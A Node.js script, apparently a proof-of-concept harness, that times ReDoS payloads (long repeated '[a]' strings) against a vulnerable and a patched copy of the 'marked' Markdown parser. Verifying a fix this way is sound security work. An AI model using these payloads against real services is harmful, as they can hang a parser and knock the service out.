const fs = require('fs');
const { execSync } = require('child_process');

const payloads = [
  "var payload = '[' + 'a]'.repeat(1000) + ': ';",
  "var payload = '[' + ']a'.repeat(1000) + ': ';",
  "var payload = '[' + 'a]'.repeat(10000) + ': ';",
  "var payload = '[' + 'a]'.repeat(30000) + ': ';"
];

for (let i = 0; i < payloads.length; i++) {
    console.log(`Trying payload ${i}...`);
    const workerTemplate = `
const path = require('path');
const marked = require(path.join(process.cwd(), process.argv[2], 'node_modules', 'marked'));
${payloads[i]}
marked(payload);
    `;
    fs.writeFileSync('temp_worker.js', workerTemplate);
    
    let timeVuln = 0;
    let timePatched = 0;
    
    try {
        const start1 = Date.now();
        execSync('node temp_worker.js seed-repo-vulnerable', { timeout: 2000, stdio: 'ignore' });
        timeVuln = Date.now() - start1;
    } catch (e) {
        timeVuln = 2000;
    }
    
    try {
        const start2 = Date.now();
        execSync('node temp_worker.js seed-repo-patched', { timeout: 2000, stdio: 'ignore' });
        timePatched = Date.now() - start2;
    } catch (e) {
        timePatched = 2000;
    }
    
    console.log(`Payload ${i}: Vuln took ${timeVuln}ms, Patched took ${timePatched}ms`);
}
